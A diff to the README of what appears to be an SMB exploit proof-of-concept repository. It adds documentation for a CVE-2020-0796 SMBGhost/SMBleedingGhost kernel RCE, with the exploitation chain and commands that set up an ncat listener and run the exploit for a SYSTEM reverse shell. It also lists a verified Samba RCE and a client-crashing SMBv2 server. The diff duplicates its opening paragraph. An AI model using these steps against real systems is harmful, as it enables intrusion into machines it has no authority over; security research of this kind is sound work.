@@ -3,6 +3,11 @@
 Educational proof-of-concept scripts for SMB vulnerabilities. Authorized
 testing only — do not run against systems you do not own.
 
+## SMB exploit PoCs
+
+Educational proof-of-concept scripts for SMB vulnerabilities. Authorized
+testing only — do not run against systems you do not own.
+
 ## Repository layout
 
 ```
@@ -10,6 +15,11 @@ cve-2007-2447/
   cve_2007_2447.py       Samba pre-auth RCE (works, verified)
 cve-2009-3103/
   cve_2009_3103_smbv2_server.py   Malicious SMBv2 server (crashes Windows clients)
+cve-2020-0796/
+  BleedingGhost.py       SMBGhost/SMBleedingGhost RCE (Windows 10 1903/1909)
+  calc_target_offsets.bat
+  smbghost_kshellcode_x64.asm
+  tools/                 Debugging helpers (cdb/dbghelp/link etc.)
 smb_test_server.py       Benign SMB1 protocol test server (not an exploit)
 README.md                This file — shared by all folders
 ```
@@ -71,6 +81,35 @@ python cve-2009-3103/cve_2009_3103_smbv2_server.py
 ```
 
 Ported to Python 3 (`collections.OrderedDict`, bytes-safe packet building).
+
+## cve-2020-0796/ — SMBGhost / BleedingGhost (Windows RCE)
+
+Remote code execution PoC for **CVE-2020-0796** / "SMBGhost", extended as
+"SMBleedingGhost" (chaining with SMBleed **CVE-2020-1206**). Targets **Windows
+10 1903 and 1909**. Original by ZecOps, Inc.
+
+The script uses SMBv3 compression and a complex memory-corruption chain to
+obtain a kernel read/write primitive, write shellcode to a known kernel
+address, clear its NX bit, and hijack a srvnet callback for execution (SYSTEM
+shell via ncat). It is **not** universal: you must run
+`calc_target_offsets.bat` on the target to obtain correct offsets for the
+current build and paste them into `BleedingGhost.py`'s `OFFSETS` dict, and it
+works best on single-CPU/VM targets.
+
+```bash
+# On the target (Windows 10 1903/1909): collect offsets
+calc_target_offsets.bat
+
+# Start a listener
+ncat -lvp 4444
+
+# Run from attacker (Windows/Linux with ncat available)
+python cve-2020-0796/BleedingGhost.py <target_ip> <listener_ip> <listener_port>
+```
+
+See `cve-2020-0796/README.md` for the full original documentation and
+technical writeup links. Requires no extra Python packages beyond the
+standard library on Windows (uses `ctypes` to call `ntdll`).
 
 ## smb_test_server.py — benign protocol test server
 
